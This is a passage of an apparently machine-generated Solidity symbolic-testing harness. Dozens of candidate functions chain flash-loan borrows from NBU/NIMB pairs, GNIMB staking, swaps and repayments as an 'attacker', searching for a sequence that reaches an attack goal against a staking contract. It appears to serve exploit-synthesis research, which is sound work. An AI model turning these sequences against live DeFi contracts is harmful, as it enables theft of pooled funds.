        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand4064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
